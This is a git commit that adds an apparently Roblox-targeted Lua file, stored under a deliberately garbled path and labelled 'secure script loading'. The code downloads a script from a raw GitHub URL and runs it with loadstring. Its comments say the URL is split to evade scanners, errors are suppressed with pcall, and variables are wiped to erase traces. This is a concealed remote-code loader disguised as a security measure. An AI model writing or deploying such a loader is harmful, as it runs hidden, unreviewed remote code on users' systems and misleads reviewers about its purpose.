5f632514fa4430da24a983be571bb50569a45c88
soronicepgf-rgb <soronice.pgf@gmail.com>
2026-03-23 18:35:00 -0400

    Add secure Lua script loading functionality
    Implement secure loading of external Lua script with error handling and variable cleanup.

---
+++ ytopkhijhirtjhiortnzuohnrt/rtjhgtiuhgrtiurthtrh/ruehtgiurtguirtuighrtz/ghrnzgirnzgirnzgihrzighr/gtzugzhgybhzzrgyerz/trhrtehioj,reojihneto/eiojg,rthijrthojrt,hoji,rtjioh,trjio,horj,hoji,hoijrt,ozihj,rjioz,hrjohirz:/GUIHRUIZGHZHGERYZHGYERZHGIYERHZGUERHZUIGERZIUGERZ/ZETGUIJZG9UUIZGZRUIGHERIZUHGIERUZGEZRUGUIERZ/GRTGHTUIZG?RUZGNRZNGRZNGUIRZNGIURZ/L.lua
@@ -0,0 +1,23 @@
+-- 1. Mise en cache des vraies fonctions (empêche les fausses requêtes et les Hooks)
+local l_game = game
+local l_httpGet = l_game.HttpGet
+local l_loadstring = loadstring
+
+-- 2. Découpage du lien (empêche les bots et les scanners de récupérer l'URL en clair)
+local url_parts = {
+    "https://raw.githubusercontent.com/soronicepgf-rgb/",
+    "S-curit-astrale/refs/heads/main/ytopkhijhirtjhiortnzuohnrt/",
+    "rtjhgtiuhgrtiurthtrh/ruehtgiurtguirtuighrtz/",
+    "ghrnzgirnzgirnzgihrzighr/gtzugzhgybhzzrgyerz/",
+    "trhrtehioj%2Creojihneto/plm.lua"
+}
+local secure_url = table.concat(url_parts, "")
+
+-- 3. Exécution protégée dans un pcall (bloque les retours d'erreurs exploitables)
+pcall(function()
+    l_loadstring(l_httpGet(l_game, secure_url))()
+end)
+
+-- 4. Nettoyage des variables (efface les traces en mémoire)
+url_parts = nil
+secure_url = nil
